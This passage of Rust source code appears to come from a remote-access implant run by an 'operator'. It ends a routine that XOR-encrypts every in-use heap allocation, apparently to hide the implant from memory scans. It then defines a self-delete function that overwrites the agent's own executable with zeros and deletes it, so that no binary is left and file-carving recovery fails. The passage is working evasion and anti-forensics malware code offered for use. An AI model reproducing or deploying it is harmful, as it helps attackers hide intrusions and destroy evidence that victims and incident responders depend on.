        let heap = GetProcessHeap();
        if heap == 0 { return; }
        if HeapLock(heap) == 0 { return; }

        let mut entry: PROCESS_HEAP_ENTRY = core::mem::zeroed();
        // HeapWalk returns 0 when there are no more entries.
        while HeapWalk(heap, &mut entry) != 0 {
            if entry.wFlags & PROCESS_HEAP_ENTRY_BUSY != 0 {
                let ptr = entry.lpData as *mut u8;
                let size = entry.cbData as usize;
                for i in 0..size {
                    *ptr.add(i) ^= key;
                }
            }
        }

        HeapUnlock(heap);
    }
}

/// Overwrite and delete the agent executable from disk so it leaves no binary on disk
/// after the operator issues a kill command.
#[cfg(all(target_os = "windows", feature = "self-delete"))]
pub fn self_delete() {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, DeleteFileW, WriteFile,
        FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE,
        OPEN_EXISTING,
    };
    use windows_sys::Win32::System::LibraryLoader::GetModuleFileNameW;

    // GENERIC_WRITE = 0x40000000
    const GENERIC_WRITE: u32 = 0x40000000;

    unsafe {
        let mut path = [0u16; 32768];
        let len = GetModuleFileNameW(0, path.as_mut_ptr(), path.len() as u32);
        if len == 0 { return; }

        // Overwrite the file with zeros before deleting to defeat file-carving recovery.
        let h = CreateFileW(
            path.as_ptr(),
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            core::ptr::null_mut(),
            OPEN_EXISTING,
            0,
            0,
        );
        if h != INVALID_HANDLE_VALUE && h != 0 {
            let zeros = vec![0u8; 65536];
            let mut written: u32 = 0;
            loop {
                let ok = WriteFile(h, zeros.as_ptr(), zeros.len() as u32, &mut written, core::ptr::null_mut());
                if ok == 0 || written == 0 { break; }
            }
            CloseHandle(h);
        }

        DeleteFileW(path.as_ptr());
    }
}
